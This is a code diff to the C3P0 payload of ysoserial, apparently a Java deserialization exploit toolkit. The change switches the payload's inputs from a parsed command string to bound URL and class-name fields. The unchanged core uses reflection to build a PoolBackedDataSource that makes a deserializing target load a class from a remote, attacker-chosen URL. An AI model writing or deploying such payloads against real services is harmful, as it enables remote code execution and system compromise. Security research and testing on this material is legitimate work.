@@ -2,6 +2,7 @@ package ysoserial.payloads;
 
 
 import java.io.PrintWriter;
+import java.net.URL;
 import java.sql.SQLException;
 import java.sql.SQLFeatureNotSupportedException;
 import java.util.logging.Logger;
@@ -15,6 +16,8 @@ import javax.sql.PooledConnection;
 import com.mchange.v2.c3p0.PoolBackedDataSource;
 import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
 
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.PayloadRunner;
@@ -40,18 +43,21 @@ import ysoserial.payloads.util.Reflections;
 @PayloadTest ( harness = "ysoserial.payloads.RemoteClassLoadingTest" )
 @Dependencies( { "com.mchange:c3p0:0.9.5.2" ,"com.mchange:mchange-commons-java:0.2.11"} )
 public class C3P0 implements ObjectPayload<Object> {
+	
+	@Bind private URL url;
+	@Bind private String className;
 
-    public Object getObject ( String command ) throws Exception {
-        int sep = command.lastIndexOf(':');
-        if ( sep < 0 ) {
-            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
-        }
+    /**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
+	public Object getObject ( String command ) throws Exception {
+		return getObject();
+	}
 
-        String url = command.substring(0, sep);
-        String className = command.substring(sep + 1);
-        
+
+	public Object getObject ( ) throws Exception {        
         PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
-        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
+        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url.toString()));
         return b;
     }
 
